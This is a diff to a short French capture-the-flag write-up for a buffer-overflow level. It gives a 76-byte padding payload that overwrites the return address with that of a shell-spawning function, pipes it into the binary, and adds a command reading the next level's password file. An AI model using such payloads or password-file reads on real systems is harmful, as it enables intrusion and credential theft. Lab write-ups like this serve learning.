@@ -6,7 +6,9 @@ trouve une fonction run qui exécute un shell. On trouve avec un outil en ligne
 un offset de 76 pour l'addresse de retour. On trouve l'adresse de la fonction
 run avec objdump -d level1. On met cette adresse de retour dans la string qu'on
 va donner au programme. Au final, on construit la string comme suit :
-python -c 'print "\x90"*76 + "\x44\x84\x04\x08" > /tmp/level1
+python -c 'print "\x90"*76 + "\x44\x84\x04\x08"' > /tmp/level1
 Ensuite, on lance le programme comme suit :
 cat /tmp/level1 - | ./level1
 On a là un shell, qui nous permet de récupérer le flag. 
+
+cat /home/user/level2/.pass
